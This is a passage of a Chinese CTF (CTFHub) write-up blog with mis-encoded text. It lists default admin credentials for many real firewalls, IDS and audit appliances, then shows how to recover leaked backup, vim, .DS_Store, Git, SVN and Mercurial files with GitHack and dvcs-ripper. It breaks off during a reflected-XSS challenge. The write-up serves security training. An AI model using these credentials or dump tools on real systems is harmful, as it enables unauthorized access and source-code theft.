class="keyword">admin</span></span><br><span class="line">SANGFORé˜²ç«å¢™    <span class="keyword">admin</span>    sangfor</span><br><span class="line">æ·±ä¿¡æœAF(NGAF V2<span class="number">.2</span>)    <span class="keyword">admin</span>    sangfor</span><br><span class="line">æ·±ä¿¡æœNGAFä¸‹ä¸€ä»£åº”ç”¨é˜²ç«å¢™(NGAF V4<span class="number">.3</span>)    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">æ·±ä¿¡æœAD3<span class="number">.9</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">æ·±ä¿¡æœä¸Šç½‘è¡Œä¸ºç®¡ç†è®¾å¤‡æ•°æ®ä¸­å¿ƒ    <span class="keyword">Admin</span>    å¯†ç ä¸ºç©º</span><br><span class="line">SANGFOR_AD_v5<span class="number">.1</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">ç½‘å¾¡æ¼æ´æ‰«æç³»ç»Ÿ    leadsec    leadsec</span><br><span class="line">å¤©é˜—å…¥ä¾µæ£€æµ‹ä¸ç®¡ç†ç³»ç»Ÿ V7<span class="number">.0</span>    <span class="keyword">Admin</span>    venus70</span><br><span class="line">Audit    venus70</span><br><span class="line">adm    venus70</span><br><span class="line">å¤©é˜—å…¥ä¾µæ£€æµ‹ä¸ç®¡ç†ç³»ç»Ÿ V6<span class="number">.0</span>    <span class="keyword">Admin</span>    venus60</span><br><span class="line">Audit    venus60</span><br><span class="line">adm    venus60</span><br><span class="line">ç½‘å¾¡WAFé›†ä¸­æ§åˆ¶ä¸­å¿ƒ(V3<span class="number">.0</span>R5<span class="number">.0</span>)    <span class="keyword">admin</span>    leadsec.waf</span><br><span class="line">audit    leadsec.waf</span><br><span class="line">adm    leadsec.waf</span><br><span class="line">è”æƒ³ç½‘å¾¡    administrator    administrator</span><br><span class="line">ç½‘å¾¡äº‹ä»¶æœåŠ¡å™¨    <span class="keyword">admin</span>    admin123</span><br><span class="line">è”æƒ³ç½‘å¾¡é˜²ç«å¢™PowerV    administrator    administrator</span><br><span class="line">è”æƒ³ç½‘å¾¡å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ    lenovo    <span class="keyword">default</span></span><br><span class="line">ç½‘ç»œå«å£«å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ    <span class="keyword">admin</span>    talent</span><br><span class="line">ç½‘å¾¡å…¥ä¾µæ£€æµ‹ç³»ç»ŸV3<span class="number">.2</span><span class="number">.72</span><span class="number">.0</span>    adm    leadsec32</span><br><span class="line"><span class="keyword">admin</span>    leadsec32</span><br><span class="line">è”æƒ³ç½‘å¾¡å…¥ä¾µæ£€æµ‹ç³»ç»ŸIDS    root    <span class="number">111111</span></span><br><span class="line"><span class="keyword">admin</span>    admin123</span><br><span class="line">ç§‘æ¥ç½‘ç»œå›æº¯åˆ†æç³»ç»Ÿ    csadmin    colasoft</span><br><span class="line">ä¸­æ§è€ƒå‹¤æœºweb3<span class="number">.0</span>    administrator    <span class="number">123456</span></span><br><span class="line">H3C iMC    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C SecPathç³»åˆ—    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C S5120-SI    test    <span class="number">123</span></span><br><span class="line">H3Cæ™ºèƒ½ç®¡ç†ä¸­å¿ƒ    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C ER3100    <span class="keyword">admin</span>    adminer3100</span><br><span class="line">H3C ER3200    <span class="keyword">admin</span>    adminer3200</span><br><span class="line">H3C ER3260    <span class="keyword">admin</span>    adminer3260</span><br><span class="line">H3C    <span class="keyword">admin</span>    adminer</span><br><span class="line"><span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">admin</span>    h3capadmin</span><br><span class="line">h3c    h3c</span><br><span class="line"><span class="number">360</span>å¤©æ“    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">ç½‘ç¥é˜²ç«å¢™    firewall    firewall</span><br><span class="line">å¤©èä¿¡é˜²ç«å¢™NGFW4000    superman    talent</span><br><span class="line">é»‘ç›¾é˜²ç«å¢™    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">rule</span>    abc123</span><br><span class="line">audit    abc123</span><br><span class="line">åä¸ºé˜²ç«å¢™    telnetuser    telnetpwd</span><br><span class="line">ftpuser    ftppwd</span><br><span class="line">æ–¹æ­£é˜²ç«å¢™    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">é£å¡”é˜²ç«å¢™    <span class="keyword">admin</span>    å¯†ç ä¸ºç©º</span><br><span class="line">Juniper_SSG__5é˜²ç«å¢™    netscreen    netscreen</span><br><span class="line">ä¸­æ–°é‡‘ç›¾ç¡¬ä»¶é˜²ç«å¢™    <span class="keyword">admin</span>    <span class="number">123</span></span><br><span class="line">killé˜²ç«å¢™(å† ç¾¤é‡‘è¾°)    <span class="keyword">admin</span>    sys123</span><br><span class="line">å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™    <span class="keyword">admin</span>    venus.fw</span><br><span class="line">Audit    venus.audit</span><br><span class="line">useradmin    venus.<span class="keyword">user</span></span><br><span class="line">é˜¿å§†ç‘ç‰¹é˜²ç«å¢™    <span class="keyword">admin</span>    manager</span><br><span class="line">å±±çŸ³ç½‘ç§‘    hillstone    hillstone</span><br><span class="line">ç»¿ç›Ÿå®‰å…¨å®¡è®¡ç³»ç»Ÿ    weboper    weboper</span><br><span class="line">webaudit    webaudit</span><br><span class="line">conadmin    conadmin</span><br><span class="line"><span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">shell    shell</span><br><span class="line">ç»¿ç›Ÿäº§å“        nsfocus123</span><br><span class="line">TopAuditæ—¥å¿—å®¡è®¡ç³»ç»Ÿ    superman    talent</span><br><span class="line">LogBaseæ—¥å¿—ç®¡ç†ç»¼åˆå®¡è®¡ç³»ç»Ÿ    <span class="keyword">admin</span>    safetybase</span><br><span class="line">ç½‘ç¥SecFoxè¿ç»´å®‰å…¨ç®¡ç†ä¸å®¡è®¡ç³»ç»Ÿ    <span class="keyword">admin</span>    !<span class="number">1</span>fw@<span class="number">2</span>soc#<span class="number">3</span>vpn</span><br><span class="line">å¤©èä¿¡æ•°æ®åº“å®¡è®¡ç³»ç»Ÿ    superman    telent</span><br><span class="line">Hillstoneå®‰å…¨å®¡è®¡å¹³å°    hillstone    hillstone</span><br><span class="line">ç½‘åº·æ—¥å¿—ä¸­å¿ƒ    ns25000    ns25000</span><br><span class="line">ç½‘ç»œå®‰å…¨å®¡è®¡ç³»ç»Ÿï¼ˆä¸­ç§‘æ–°ä¸šï¼‰    <span class="keyword">admin</span>    <span class="number">123456</span></span><br><span class="line">å¤©ç¥ç½‘ç»œå®‰å…¨å®¡è®¡ç³»ç»Ÿ    <span class="keyword">Admin</span>    cyberaudit</span><br><span class="line">æ˜å¾¡WEBåº”ç”¨é˜²ç«å¢™    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">admin</span>    adminadmin</span><br><span class="line">æ˜å¾¡æ”»é˜²å®éªŒå®¤å¹³å°    root    <span class="number">123456</span></span><br><span class="line">æ˜å¾¡å®‰å…¨ç½‘å…³    <span class="keyword">admin</span>    adminadmin</span><br><span class="line">æ˜å¾¡è¿ç»´å®¡è®¡ä¸å†Œé£é™©æ§åˆ¶ç³»ç»Ÿ    <span class="keyword">admin</span>    <span class="number">1</span>q2w3e</span><br><span class="line"><span class="keyword">system</span>    <span class="number">1</span>q2w3e4r</span><br><span class="line">auditor    <span class="number">1</span>q2w3e</span><br><span class="line"><span class="keyword">operator</span>    <span class="number">1</span>q2w3e4r</span><br><span class="line">æ˜å¾¡ç½‘ç«™å«å£«    sysmanager    sysmanager888</span><br><span class="line">äº¿é‚®é‚®ä»¶ç½‘å…³    eyouuser    eyou_admin</span><br><span class="line">eyougw    <span class="keyword">admin</span>@(eyou)</span><br><span class="line"><span class="keyword">admin</span>    +-ccccc</span><br><span class="line"><span class="keyword">admin</span>    cyouadmin</span><br><span class="line">Websenseé‚®ä»¶å®‰å…¨ç½‘å…³    administrator    <span class="keyword">admin</span></span><br><span class="line">æ¢­å­é±¼é‚®ä»¶å­˜å‚¨ç½‘å…³    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br></pre></td></tr></table></figure>

<h2 id="2-ä¿¡æ¯æ³„éœ²-å¤‡ä»½æ–‡ä»¶ä¸‹è½½"><a href="#2-ä¿¡æ¯æ³„éœ²-å¤‡ä»½æ–‡ä»¶ä¸‹è½½" class="headerlink" title="2.ä¿¡æ¯æ³„éœ²-å¤‡ä»½æ–‡ä»¶ä¸‹è½½"></a>2.ä¿¡æ¯æ³„éœ²-å¤‡ä»½æ–‡ä»¶ä¸‹è½½</h2><p><img src="/post/wp-CTFHub/image-20220919213733369.png" alt="image-20220919213733369"></p>
<h2 id="2-1-ä¿¡æ¯æ³„éœ²-robots-txt"><a href="#2-1-ä¿¡æ¯æ³„éœ²-robots-txt" class="headerlink" title="2.1 ä¿¡æ¯æ³„éœ²-robots.txt"></a>2.1 ä¿¡æ¯æ³„éœ²-robots.txt</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">è®¿é—®url/robots.txt</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹çˆ¬è™«åè®®</p>
<h2 id="2-2-ä¿¡æ¯æ³„éœ²-bakæ–‡ä»¶"><a href="#2-2-ä¿¡æ¯æ³„éœ²-bakæ–‡ä»¶" class="headerlink" title="2.2 ä¿¡æ¯æ³„éœ²-bakæ–‡ä»¶"></a>2.2 ä¿¡æ¯æ³„éœ²-bakæ–‡ä»¶</h2><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">è®¿é—®url/æ–‡ä»¶å.åç¼€å<span class="string">.bak</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹è½½bakï¼ˆå¤‡ä»½æ–‡ä»¶ï¼‰</p>
<h2 id="2-3-ä¿¡æ¯æ³„éœ²-vimç¼“å­˜"><a href="#2-3-ä¿¡æ¯æ³„éœ²-vimç¼“å­˜" class="headerlink" title="2.3 ä¿¡æ¯æ³„éœ²-vimç¼“å­˜"></a>2.3 ä¿¡æ¯æ³„éœ²-vimç¼“å­˜</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åœ¨ä½¿ç”¨<code>vim</code>æ—¶ä¼šåˆ›å»ºä¸´æ—¶ç¼“å­˜æ–‡ä»¶ï¼Œå…³é—­<code>vim</code>æ—¶ç¼“å­˜æ–‡ä»¶åˆ™ä¼šè¢«åˆ é™¤ï¼Œå½“<code>vim</code>å¼‚å¸¸é€€å‡ºåï¼Œå› ä¸ºæœªå¤„ç†ç¼“å­˜æ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ç¼“å­˜æ–‡ä»¶æ¢å¤åŸå§‹æ–‡ä»¶å†…å®¹</p>
<p>ä»¥ <code>index.php</code> ä¸ºä¾‹ï¼š<br><strong>ç¬¬ä¸€æ¬¡</strong>äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º <code>.index.php.swp</code></p>
<p><strong>å†æ¬¡æ„å¤–é€€å‡º</strong>åï¼Œå°†ä¼šäº§ç”Ÿåä¸º <code>.index.php.swo</code> çš„äº¤æ¢æ–‡ä»¶</p>
<p><strong>ç¬¬ä¸‰æ¬¡äº§ç”Ÿ</strong>çš„äº¤æ¢æ–‡ä»¶åˆ™ä¸º <code>.index.php.swn</code><br>ä½œç”¨</p>
<p><u>å¯ç”¨æ¥æ¢å¤æ„å¤–é€€å‡ºçš„æ–‡ä»¶</u></p>
<h3 id="å¦‚ä½•åˆ©ç”¨"><a href="#å¦‚ä½•åˆ©ç”¨" class="headerlink" title="å¦‚ä½•åˆ©ç”¨"></a>å¦‚ä½•åˆ©ç”¨</h3><p><code>SWP</code>æ–‡ä»¶ä¸ºéšè—æ–‡ä»¶ï¼Œæ“ä½œæ—¶éœ€è¦åœ¨æ–‡ä»¶åå‰åŠ .</p>
<p>é’ˆå¯¹<code>SWP</code>å¤‡ä»½æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>vim -r filename</code>å‘½ä»¤æ¥æ¢å¤æ–‡ä»¶<br>(<code>vim</code>ä½¿ç”¨çš„ç¼“å­˜å­˜å‚¨ä¸ºä¸€ç§å›ºå®šæ ¼å¼çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚è€Œæˆ‘ä»¬ä¸€èˆ¬ç¼–è¾‘çš„æ—¶æ˜é—®å¯è§å­—ç¬¦ï¼Œåœ¨vimçš„ç¼“å­˜ä¸­è¿™äº›å¯è§å­—ç¬¦ä¼šåŸæ ·ä¿ç•™,æ‰€ä»¥æ˜¾ç¤ºæ˜¯ä¸€ç§ä¹±ç )<br>æ ¹æ®æç¤ºæŒ‰å›è½¦è¿›è¡Œæ¢å¤</p>
<h2 id="2-4-ä¿¡æ¯æ³„éœ²-DS-Store"><a href="#2-4-ä¿¡æ¯æ³„éœ²-DS-Store" class="headerlink" title="2.4 ä¿¡æ¯æ³„éœ²-.DS_Store"></a>2.4 ä¿¡æ¯æ³„éœ²-.DS_Store</h2><blockquote>
<p>.DS_Store æ˜¯ Mac OS ä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ã€‚é€šè¿‡.DS_Storeå¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">è®¿é—®url/.DS_Store</span><br></pre></td></tr></table></figure>

<p>ä¸‹è½½<code>DS_Store</code>æ–‡ä»¶</p>
<h2 id="3-ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-log"><a href="#3-ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-log" class="headerlink" title="3.ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-log"></a>3.ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-log</h2><p> ç¬¬ä¸€æ¬¡ä½¿ç”¨<strong>githack</strong>ï¼Œè®°å½•ä¸€ä¸‹</p>
<p><strong>æ³¨æ„githackéœ€è¦python2.7ç‰ˆæœ¬</strong></p>
<p><code>å½“å‰å¤§é‡å¼€å‘äººå‘˜ä½¿ç”¨gitè¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå°†.gitæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº†gitæ³„éœ²æ¼æ´ã€‚</code></p>
<p><code>GitHackæ˜¯ä¸€ä¸ª.gitæ³„éœ²åˆ©ç”¨æµ‹è¯•è„šæœ¬ï¼Œé€šè¿‡æ³„éœ²çš„æ–‡ä»¶ï¼Œè¿˜åŸé‡å»ºå·¥ç¨‹æºä»£ç ã€‚</code></p>
<h3 id="å·¥ä½œåŸç†"><a href="#å·¥ä½œåŸç†" class="headerlink" title="å·¥ä½œåŸç†"></a>å·¥ä½œåŸç†</h3><p>1ã€è§£æ<code>.git/index</code>æ–‡ä»¶ï¼Œæ‰¾åˆ°å·¥ç¨‹ä¸­æ‰€æœ‰çš„ï¼š ( æ–‡ä»¶åï¼Œæ–‡ä»¶sha1 )<br>2ã€å»<code>.git/objects/</code> æ–‡ä»¶å¤¹ä¸‹ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶<br>3ã€<code>zlib</code>è§£å‹æ–‡ä»¶ï¼ŒæŒ‰åŸå§‹çš„ç›®å½•ç»“æ„å†™å…¥æºä»£ç </p>
<h3 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h3><p>é€Ÿåº¦å¿«ï¼Œé»˜è®¤20ä¸ªå·¥ä½œçº¿ç¨‹<br>å°½é‡è¿˜åŸæ‰€æœ‰çš„æºä»£ç ï¼Œç¼ºå¤±çš„æ–‡ä»¶ä¸å½±å“è„šæœ¬å·¥ä½œ<br>è„šæœ¬ä¸éœ€è¦æ‰§è¡Œé¢å¤–çš„gitå‘½ä»¤ï¼Œ<code>all you need is python</code><br>è„šæœ¬æ— éœ€æµè§ˆç›®å½•</p>
<h3 id="ç”¨æ³•ç¤ºä¾‹"><a href="#ç”¨æ³•ç¤ºä¾‹" class="headerlink" title="ç”¨æ³•ç¤ºä¾‹"></a>ç”¨æ³•ç¤ºä¾‹</h3><p>æ³¨æ„è¿™é‡Œåœ¨urlåé¢éœ€è¦åŠ ä¸Š.gitï¼Œç”¨dirsearchå¯ä»¥æ‰«å‡ºæ¥ï¼ˆpython3ï¼‰</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">GitHack.py http:<span class="regexp">//</span>www.openssl.org<span class="regexp">/.git/</span></span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨ç›®å½•<code>dist</code>å°±ä¼šç”Ÿæˆå¯¹åº”ç›®å½• </p>
<p>æ‰“å¼€ç›®å½•ï¼Œè¾“å…¥<code>cmd</code>ï¼Œæ‰§è¡Œ<code>git log</code>ã€<code>git log</code> å¯ä»¥æŸ¥çœ‹<code>commit history</code>ï¼Œä¹Ÿå°±æ˜¯å‘½ä»¤æ‰§è¡Œçš„å†å²ï¼Œå¯ä»¥çœ‹çœ‹ä¹‹å‰æ‰§è¡Œè¿‡å“ªäº›å‘½ä»¤ï¼Œæ–¹ä¾¿åé¢æŸ¥è¯¢å‘½ä»¤æ‰§è¡Œçš„å…·ä½“å†…å®¹ã€‘</p>
<p><img src="/post/wp-CTFHub/image-20220728230330073.png" alt="image-20220728230330073"></p>
<p>ç„¶åå¤åˆ¶<code>add flag</code>è¿™ä¸ªå‘½ä»¤çš„ä»£ç ï¼Œå¦‚ä¸Šå›¾<code>75272ca078b7eedcf329a2b08f6e4faae0a36a99</code></p>
<p>ç„¶åç”¨<code>git diff</code></p>
<p>ã€</p>
<p>git diffæ¯”è¾ƒä¸¤ä¸ªç‰ˆæœ¬çš„å·®å¼‚ï¼Œ</p>
<p>è¿™é‡Œåé¢åªæœ‰<strong>ä¸€ä¸ªå‘½ä»¤</strong>å°±æ˜¯æ¯”è¾ƒæœ¬åœ°å·¥ä½œåŒºå’Œç¼“å­˜åŒºçš„ä¿¡æ¯åŒºåˆ«</p>
<p>å¦‚æœåé¢æœ‰<strong>ä¸¤ä¸ªå‘½ä»¤</strong>ï¼Œå°±æ˜¯æ¯”è¾ƒè¿™ä¸¤ä¸ªå‘½ä»¤çš„å·®åˆ«</p>
<p>ã€‘</p>
<p><img src="/post/wp-CTFHub/image-20220728231134513.png" alt="image-20220728231134513"></p>
<p>è¿™é‡Œæ¯”è¾ƒï¼Œå°±å¾—åˆ°äº†<code>flag</code></p>
<h2 id="4-ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-Stash"><a href="#4-ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-Stash" class="headerlink" title="4.ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-Stash"></a>4.ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-Stash</h2><h3 id="git-stash-çš„ä½œç”¨"><a href="#git-stash-çš„ä½œç”¨" class="headerlink" title="git stash çš„ä½œç”¨"></a>git stash çš„ä½œç”¨</h3><p>git stashç”¨äºæƒ³è¦ä¿å­˜å½“å‰çš„ä¿®æ”¹,ä½†æ˜¯æƒ³å›åˆ°ä¹‹å‰æœ€åä¸€æ¬¡æäº¤çš„å¹²å‡€çš„å·¥ä½œä»“åº“æ—¶è¿›è¡Œçš„æ“ä½œ.git stashå°†æœ¬åœ°çš„ä¿®æ”¹ä¿å­˜èµ·æ¥,å¹¶ä¸”å°†å½“å‰ä»£ç åˆ‡æ¢åˆ°HEADæäº¤ä¸Š.</p>
<p>é€šè¿‡git stashå­˜å‚¨çš„ä¿®æ”¹åˆ—è¡¨,å¯ä»¥é€šè¿‡<u><strong>git stash list</strong></u>æŸ¥çœ‹.<u><strong>git stash show</strong></u>ç”¨äºæ ¡éªŒ,<u><strong>git stash apply</strong></u>ç”¨äºé‡æ–°å­˜å‚¨.ç›´æ¥æ‰§è¡Œ<u><code>git stash</code>ç­‰åŒäº<code>git stash save.</code></u></p>
<p>æœ€æ–°çš„å­˜å‚¨ä¿å­˜åœ¨<code>refs/stash</code>ä¸­è€çš„å­˜å‚¨å¯ä»¥é€šè¿‡ç›¸å…³çš„å‚æ•°è·å¾—,ä¾‹å¦‚<code>stash@&#123;0&#125;</code>è·å–æœ€æ–°çš„å­˜å‚¨,stash@{1}è·å–æ¬¡æ–°<code>.stash@&#123;2.hour.ago&#125;</code>è·å–ä¸¤å°æ—¶ä¹‹å‰çš„.å­˜å‚¨å¯ä»¥ç›´æ¥é€šè¿‡ç´¢å¼•çš„ä½ç½®æ¥è·å¾—<code>stash@&#123;n&#125;</code>.</p>
<p>æ“ä½œåŒ<code>2.log</code></p>
<p>å¯ä»¥å…ˆç”¨<code>dirsearch</code>æ‰«ä¸€ä¸‹ï¼Œ å‘ç°<code>refs/stash</code>æ–‡ä»¶ï¼Œ</p>
<p>ç„¶åç”¨<code>GitHack</code>æ‰«æ</p>
<p>åœ¨ç”Ÿæˆæ–‡ä»¶å¤¹é‡Œæœ‰<code>stash</code>æ–‡ä»¶</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">`D:\GitHack-master\dist\challenge-8d48663e236c2ebc.sandbox.ctfhub.com_10800\.git\refs`</span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-CTFHub/image-20220729115457869.png" alt="image-20220729115457869"></p>
<p>æ‰“å¼€çœ‹åˆ°</p>
<p><img src="/post/wp-CTFHub/image-20220729115528299.png" alt="image-20220729115528299"></p>
<p>åœ¨ç”Ÿæˆçš„æ–‡ä»¶å¤¹ä¸‹ç”¨</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">git diff d8c1978b1e71300574e1bb5335a01<span class="number">124b3a55569</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>flag</code></p>
<p>ã€ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>git bash</code>ï¼Œç›´æ¥åœ¨ç”Ÿæˆçš„æ–‡ä»¶å¤¹ä¸‹</p>
<p>æ‰§è¡Œ<code>git stash list</code> </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">æŸ¥çœ‹stashäº†å“ªäº›å­˜å‚¨</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‰§è¡Œ<code>git stash pop</code></p>
<pre><code>æ¢å¤ä¹‹å‰ç¼“å­˜çš„å·¥ä½œç›®å½•ï¼Œå°†ç¼“å­˜å †æ ˆä¸­çš„å¯¹åº”stashåˆ é™¤ï¼Œ
å¹¶å°†å¯¹åº”ä¿®æ”¹åº”ç”¨åˆ°å½“å‰çš„å·¥ä½œç›®å½•ä¸‹,é»˜è®¤ä¸ºç¬¬ä¸€ä¸ªstash,å³stash@&#123;0&#125;ï¼Œ

å¦‚æœè¦åº”ç”¨å¹¶åˆ é™¤å…¶ä»–stashï¼Œå‘½ä»¤ï¼šgit stash pop stash@&#123;$num&#125; ï¼Œ
æ¯”å¦‚åº”ç”¨å¹¶åˆ é™¤ç¬¬äºŒä¸ªï¼šgit stash pop stash@&#123;1&#125;ï¼‰
</code></pre>
<p>ç„¶åä¼šåœ¨è¯¥ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªæ–°çš„<code>txt</code>æ–‡ä»¶ï¼Œæ‰“å¼€æˆ–ç”¨<code>cat</code>å‘½ä»¤ï¼Œå¾—åˆ°<code>flag</code></p>
<p>ã€‘</p>
<h2 id="5-ä¿¡æ¯æ³„éœ²-SVNæ³„éœ²"><a href="#5-ä¿¡æ¯æ³„éœ²-SVNæ³„éœ²" class="headerlink" title="5.ä¿¡æ¯æ³„éœ²-SVNæ³„éœ²"></a>5.ä¿¡æ¯æ³„éœ²-SVNæ³„éœ²</h2><p><code>å½“å¼€å‘äººå‘˜ä½¿ç”¨ SVN è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.svnæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† SVN æ³„éœ²æ¼æ´ã€‚</code></p>
<p>è¿™é“é¢˜éœ€è¦è¿ç”¨<code>dvcs-ripper</code>å·¥å…·è¿›è¡Œå¤„ç†</p>
<p>å¯ä»¥å…ˆç”¨<code>dirsearch</code>æ‰«å‡º<code>.svn</code>ç›®å½•ï¼Œè¯´æ˜æœ‰<code>SVN</code>æ³„éœ²</p>
<p>å’Œ<code>githack</code>ç±»ä¼¼ï¼Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./rip-svn.pl -v -u url/.svn</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨dvcs-ripperç›®å½•é‡Œï¼Œè¿›å…¥.svnç›®å½•</p>
<p><img src="/post/wp-CTFHub/image-20220729175208298.png" alt="image-20220729175208298"></p>
<p>ç„¶åè¿›å…¥pristineç›®å½•ï¼Œè¿›å»å‘ç°ä¸¤ä¸ªç›®å½•ï¼ŒæŒ¨ä¸ªæ‰“å¼€</p>
<p><img src="/post/wp-CTFHub/image-20220729175252045.png" alt="image-20220729175252045"></p>
<p><img src="/post/wp-CTFHub/image-20220729175429878.png" alt="image-20220729175429878"></p>
<p>å‘ç°ä¸€ä¸ªç›®å½•ä¸‹æ˜¯ç½‘ç«™é¡µé¢æºç ï¼Œå¦ä¸€ä¸ªå°±æ˜¯<code>flag</code></p>
<p>å¾—åˆ°<code>flag</code></p>
<h2 id="6-ä¿¡æ¯æ³„éœ²-HGæ³„éœ²"><a href="#6-ä¿¡æ¯æ³„éœ²-HGæ³„éœ²" class="headerlink" title="6.ä¿¡æ¯æ³„éœ²-HGæ³„éœ²"></a>6.ä¿¡æ¯æ³„éœ²-HGæ³„éœ²</h2><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="string">`å½“å¼€å‘äººå‘˜ä½¿ç”¨ Mercurial è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.hg æ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† hg æ³„éœ²æ¼æ´ã€‚`</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å…ˆç”¨<code>dirsearch</code>æ‰«å‡º<code>.hg</code>ç›®å½•ï¼Œè¯´æ˜æœ‰<code>HG</code>æ³„éœ²</p>
<p>è¿™ä¸ªå’Œ<code>SVN</code>ä¸€æ ·ï¼Œåªä¸è¿‡è¦æ”¹æˆ<code>.hg</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./rip-hg.pl -v -u url/.hg</span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-CTFHub/image-20220730164340016.png" alt="image-20220730164340016"></p>
<p>å‘ç°ä¸¤ä¸ªæ–‡ä»¶ï¼ŒçŒœæµ‹ä¸º<code>HG</code>æ³„éœ²æ–‡ä»¶</p>
<p><img src="/post/wp-CTFHub/image-20220730164428184.png" alt="image-20220730164428184"></p>
<p>å‘ç°<code>flag</code>æ–‡æœ¬æ–‡ä»¶</p>
<p><img src="/post/wp-CTFHub/image-20220730164949862.png" alt="image-20220730164949862"></p>
<p><code>url+flag_973127138.txt</code></p>
<p>å¾—åˆ°<code>flag</code></p>
<h2 id="7-xss-xssåå°„å‹"><a href="#7-xss-xssåå°„å‹" class="headerlink" title="7.xss-xssåå°„å‹"></a>7.xss-xssåå°„å‹</h2><p>å‘ç°å®ƒæœ‰ä¸¤ä¸ªè¾“å…¥æ¡†</p>
<p><img src="/post/wp-CTFHub/image-20220731104635854.png" alt="image-20220731104635854"></p>
<p>ç¬¬ä¸€ä¸ªè¾“å…¥æµ‹è¯•è¯­å¥ï¼ŒæˆåŠŸå¼¹çª—</p>
<p>ç¬¬äºŒä¸ªæ˜¯å‘é€<code>url</code>ï¼Œç›²çŒœæ˜¯å‘åˆ°åå°</p>
<p>çœ‹äº†ä¸€äº›<code>wp</code>ï¼Œå‘ç°éœ€è¦ä½¿ç”¨<code>xss</code>æµ‹è¯•å¹³å°<code>http://xsscom.com//index.php</code></p>
<p>å…ˆåˆ›å»ºé¡¹ç›®</p>
<p><img src="/post/wp-CTFHub/image-20220731113619175.png" alt="image-20220731113619175"></p>
<p>è®¾ç½®é…ç½®</p>
<p><img src="/post/wp-CTFHub/image-20220731113753893.png" alt="image-20220731113753893"></p>
<p>ç„¶åç‚¹å‡»æŸ¥çœ‹ä»£ç </p>
<p><img src="/post/wp-CTFHub/image-20220731113810045.png" alt="image-20220731113810045"></p>
<p>åœ¨æœ€ä¸‹é¢çœ‹åˆ°</p>
<p><img src="/post/wp-CTFHub/image-20220731113837566.png" alt="image-20220731113837566"></p>
<p>æŠŠä»£ç </p>
